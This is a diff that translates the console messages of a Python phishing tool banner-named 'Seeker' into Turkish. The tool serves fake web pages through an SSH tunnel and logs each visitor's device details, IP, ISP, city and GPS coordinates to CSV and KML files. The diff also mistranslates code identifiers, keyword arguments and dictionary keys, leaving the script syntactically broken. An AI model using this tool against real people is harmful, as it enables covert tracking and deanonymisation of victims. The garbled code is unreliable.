@@ -8,13 +8,13 @@ W = '\033[0m'  # white
 
 from shutil import which
 
-print(G + '[+]' + C + ' Checking Dependencies...' + W)
+print(G + '[+]' + C + ' Bağımlılıkları Kontrol Et...' + W)
 pkgs = ['python3', 'pip', 'php', 'ssh']
 inst = True
 for pkg in pkgs:
 	present = which(pkg)
 	if present == None:
-		print(R + '[-] ' + W + pkg + C + ' is not Installed!')
+		print(R + '[-] ' + W + pkg + C + ' yüklü değil!')
 		inst = False
 	else:
 		pass
@@ -33,10 +33,10 @@ import requests
 import subprocess as subp
 
 parser = argparse.ArgumentParser()
-parser.add_argument('-s', '--subdomain', help='Provide Subdomain for Serveo URL ( Optional )')
-parser.add_argument('-k', '--kml', help='Provide KML Filename ( Optional )')
-parser.add_argument('-t', '--tunnel', help='Specify Tunnel Mode [ Available : manual ]')
-parser.add_argument('-p', '--port', type=int, default=8080, help='Port for Web Server [ Default : 8080 ]')
+parser.add_argument('-s', '--subdomain', help='Serveo URL'si için Alt Alan Adı Sağlayın (İsteğe bağlı )')
+parser.add_argument('-k', '--kml', help='KML Dosya Adını Sağlayın (İsteğe Bağlı )')
+parser.add_argument('-t', '--tunnel', help='Tünel Modunu Belirtin [ Mevcut : manuel ]')
+parser.add_argument('-p', '--port', type=int, default=8080, help='Web Sunucusu Bağlantı Noktası [ Varsayılan : 8080 ]')
 
 args = parser.parse_args()
 subdom = args.subdomain
@@ -58,21 +58,21 @@ def banner():
  \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/
 /____  > \___  >\___  >|__|_ \ \___  >|__|
 	 \/      \/     \/      \/     \/        ''' + W)
-	print('\n' + G + '[>]' + C + ' Created By : ' + W + 'thewhiteh4t')
+	print('\n' + G + '[>]' + C + ' Tarafından yaratıldı : ' + W + 'thewhiteh4t')
 	print(G + '[>]' + C + ' Version    : ' + W + version + '\n')
 
 def tunnel_select():
 	if tunnel_mode == None:
 		serveo()
 	elif tunnel_mode == 'manual':
-		print(G + '[+]' + C + ' Skipping Serveo, start your own tunnel service manually...' + W + '\n')
+		print(G + '[+]' + C + ' Serveo'yu atlayarak kendi tünel hizmetinizi manuel olarak başlatın...' + W + '\n')
 	else:
-		print(R + '[+]' + C + ' Invalid Tunnel Mode Selected, Check Help [-h, --help]' + W + '\n')
+		print(R + '[+]' + C + ' Geçersiz Tünel Modu Seçildi, Yardımı Kontrol Edin [-h, --help]' + W + '\n')
 		exit()
 
 def template_select():
 	global site, info, result
-	print(G + '[+]' + C + ' Select a Template : ' + W + '\n')
+	print(G + '[+]' + C + ' Bir Şablon Seçin : ' + W + '\n')
 	
 	with open('template/templates.json', 'r') as templ:
 		templ_info = templ.read()
@@ -88,16 +88,16 @@ def template_select():
 	try:
 		site = templ_json['templates'][selected]['dir_name']
 	except IndexError:
-		print('\n' + R + '[-]' + C + ' Invalid Input!' + W + '\n')
+		print('\n' + R + '[-]' + C + ' Geçersiz Giriş!' + W + '\n')
 		sys.exit()
 	
-	print('\n' + G + '[+]' + C + ' Loading {} Template...'.format(templ_json['templates'][selected]['name']) + W)
+	print('\n' + G + '[+]' + C + ' {} Şablon Yükleniyor...'.format(templ_json['templates'][selected]['name']) + W)
 	
-	module = templ_json['templates'][selected]['module']
+	module = templ_json['şablonlar'][seçilmiş]['modül']
 	if module == True:
-		imp_file = templ_json['templates'][selected]['import_file']
+		imp_file = templ_json['şablonlar'][seçilmiş]['import_file']
 		import importlib
-		importlib.import_module('template.{}'.format(imp_file))
+		importlib.import_module('şablon.{}'.format(imp_file))
 	else:
 		pass
 
@@ -108,22 +108,22 @@ def serveo():
 	global subdom
 	flag = False
 
-	print(G + '[+]' + C + ' Checking Serveo Status...', end='')
+	print(G + '[+]' + C + ' Serveo Durumunu Kontrol Etme...', son='')
 
 	try:
 		time.sleep(1)
-		rqst = requests.get('https://serveo.net', timeout=5)
+		rqst = requests.get('https://serveo.net', zaman aşımı=5)
 		sc = rqst.status_code
 		if sc == 200:
-			print(C + '[' + G + ' Online ' + C + ']' + W + '\n')
+			print(C + '[' + G + ' Çevrimiçi ' + C + ']' + W + '\n')
 		else:
-			print(C + '[' + R + 'Status : {}'.format(sc) + C + ']' + W + '\n')
+			print(C + '[' + R + 'Durum : {}'.format(sc) + C + ']' + W + '\n')
 			exit()
 	except requests.ConnectionError:
-		print(C + '[' + R + ' Offline ' + C + ']' + W + '\n')
+		print(C + '[' + R + ' çevrimdışı ' + C + ']' + W + '\n')
 		exit()
 			
-	print(G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
+	print(G + '[+]' + C + ' Serveo URL'sini Alma...' + W + '\n')
 	if subdom is None:
 		with open('logs/serveo.txt', 'w') as tmpfile:
 			proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '80:localhost:{}'.format(port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
@@ -153,7 +153,7 @@ def serveo():
 
 def server():
 	print('\n' + G + '[+]' + C + ' Port : '+ W + str(port))
-	print('\n' + G + '[+]' + C + ' Starting PHP Server......' + W, end='')
+	print('\n' + G + '[+]' + C + ' PHP Sunucusunu Başlatma......' + W, son='')
 	with open('logs/php.log', 'w') as phplog:
 		subp.Popen(['php', '-S', '0.0.0.0:{}'.format(port), '-t', 'template/{}/'.format(site)], stdout=phplog, stderr=phplog)
 		time.sleep(3)
@@ -161,11 +161,11 @@ def server():
 		php_rqst = requests.get('http://0.0.0.0:{}/index.html'.format(port))
 		php_sc = php_rqst.status_code
 		if php_sc == 200:
-			print(C + '[' + G + ' Success ' + C + ']' + W)
+			print(C + '[' + G + ' Başarılı ' + C + ']' + W)
 		else:
-			print(C + '[' + R + 'Status : {}'.format(php_sc) + C + ']' + W)
+			print(C + '[' + R + 'Durum : {}'.format(php_sc) + C + ']' + W)
 	except requests.ConnectionError:
-		print(C + '[' + R + ' Failed ' + C + ']' + W)
+		print(C + '[' + R + ' Arızalı ' + C + ']' + W)
 		Quit()
 
 def wait():
@@ -174,7 +174,7 @@ def wait():
 		time.sleep(2)
 		size = os.path.getsize(result)
 		if size == 0 and printed == False:
-			print('\n' + G + '[+]' + C + ' Waiting for User Interaction...' + W + '\n')
+			print('\n' + G + '[+]' + C + ' Kullanıcı Etkileşimi Bekleniyor...' + W + '\n')
 			printed = True
 		if size > 0:
 			main()
@@ -193,7 +193,7 @@ def main():
 				try:
 					var_cores = value['cores']
 				except TypeError:
-					var_cores = 'Not Available'
+					var_cores = 'Müsait değil'
 				var_ram = value['ram']
 				var_vendor = value['vendor']
 				var_render = value['render']
@@ -211,14 +211,14 @@ def main():
 				row.append(var_browser)
 				row.append(var_ip)
 
-				print(G + '[+]' + C + ' Device Information : ' + W + '\n')
+				print(G + '[+]' + C + ' Cihaz bilgisi : ' + W + '\n')
 				print(G + '[+]' + C + ' OS         : ' + W + var_os)
-				print(G + '[+]' + C + ' Platform   : ' + W + var_platform)
+				print(G + '[+]' + C + ' platform   : ' + W + var_platform)
 				print(G + '[+]' + C + ' CPU Cores  : ' + W + var_cores)
 				print(G + '[+]' + C + ' RAM        : ' + W + var_ram)
 				print(G + '[+]' + C + ' GPU Vendor : ' + W + var_vendor)
 				print(G + '[+]' + C + ' GPU        : ' + W + var_render)
-				print(G + '[+]' + C + ' Resolution : ' + W + var_res)
+				print(G + '[+]' + C + ' Çözünürlük : ' + W + var_res)
 				print(G + '[+]' + C + ' Browser    : ' + W + var_browser)
 				print(G + '[+]' + C + ' Public IP  : ' + W + var_ip)
 
@@ -242,12 +242,12 @@ def main():
 					row.append(var_org)
 					row.append(var_isp)
 
-					print(G + '[+]' + C + ' Continent  : ' + W + var_continent)
-					print(G + '[+]' + C + ' Country    : ' + W + var_country)
-					print(G + '[+]' + C + ' Region     : ' + W + var_region)
-					print(G + '[+]' + C + ' City       : ' + W + var_city)
-					print(G + '[+]' + C + ' Org        : ' + W + var_org)
-					print(G + '[+]' + C + ' ISP        : ' + W + var_isp)
+					print(G + '[+]' + C + ' Kıta  : ' + W + var_continent)
+					print(G + '[+]' + C + ' Ülke    : ' + W + var_country)
+					print(G + '[+]' + C + ' Bölge     : ' + W + var_region)
+					print(G + '[+]' + C + ' Şehir       : ' + W + var_city)
+					print(G + '[+]' + C + ' Kuruluş        : ' + W + var_org)
+					print(G + '[+]' + C + ' İSS        : ' + W + var_isp)
 	except ValueError:
 		pass
 	
@@ -262,19 +262,19 @@ def main():
 
 				var_alt = value['alt']
 				if var_alt == '':
-					var_alt = 'Not Available'
+					var_alt = 'Müsait değil'
 				else:
 					var_alt == value['alt'] + ' m'
 				
 				var_dir = value['dir']
 				if var_dir == '':
-					var_dir = 'Not Available'
+					var_dir = 'Müsait değil'
 				else:
 					var_dir = value['dir'] + ' deg'
 				
 				var_spd = value['spd']
 				if var_spd == '':
-					var_spd = 'Not Available'
+					var_spd = 'Müsait değil'
 				else:
 					var_spd = value['spd'] + ' m/s'
 
@@ -285,13 +285,13 @@ def main():
 				row.append(var_dir)
 				row.append(var_spd)
 
-				print ('\n' + G + '[+]' + C + ' Location Information : ' + W + '\n')
-				print (G + '[+]' + C + ' Latitude  : ' + W + var_lat)
-				print (G + '[+]' + C + ' Longitude : ' + W + var_lon)
-				print (G + '[+]' + C + ' Accuracy  : ' + W + var_acc)
-				print (G + '[+]' + C + ' Altitude  : ' + W + var_alt)
-				print (G + '[+]' + C + ' Direction : ' + W + var_dir)
-				print (G + '[+]' + C + ' Speed     : ' + W + var_spd)
+				print ('\n' + G + '[+]' + C + ' konum bilgisi : ' + W + '\n')
+				print (G + '[+]' + C + ' Enlem  : ' + W + var_lat)
+				print (G + '[+]' + C + ' Boylam : ' + W + var_lon)
+				print (G + '[+]' + C + ' Kesinlik  : ' + W + var_acc)
+				print (G + '[+]' + C + ' Rakım  : ' + W + var_alt)
+				print (G + '[+]' + C + ' Yön : ' + W + var_dir)
+				print (G + '[+]' + C + ' Hız     : ' + W + var_spd)
 	except ValueError:
 		error = file
 		print ('\n' + R + '[-] ' + W + error)
@@ -315,14 +315,14 @@ def kmlout(var_lat, var_lon):
 	with open('{}.kml'.format(kml_fname), 'w') as kml_gen:
 		kml_gen.write(kml_sample_data)
 
-	print(G + '[+]' + C + ' KML File Generated..........: ' + W + os.getcwd() + '/{}.kml'.format(kml_fname))
+	print(G + '[+]' + C + ' KML Dosyası Oluşturuldu..........: ' + W + os.getcwd() + '/{}.kml'.format(kml_fname))
 
 def csvout():
 	global row
 	with open('db/results.csv', 'a') as csvfile:
 		writer = csv.writer(csvfile)
 		writer.writerow(row)
-	print(G + '[+]' + C + ' New Entry Added in Database.: ' + W + os.getcwd() + '/db/results.csv')
+	print(G + '[+]' + C + ' Veritabanına Yeni Giriş Eklendi.: ' + W + os.getcwd() + '/db/results.csv')
 
 def clear():
 	global result
@@ -349,5 +349,5 @@ try:
 	main()
 
 except KeyboardInterrupt:
-	print ('\n' + R + '[!]' + C + ' Keyboard Interrupt.' + W)
+	print ('\n' + R + '[!]' + C + ' Klavye Kesintisi.' + W)
 	Quit()
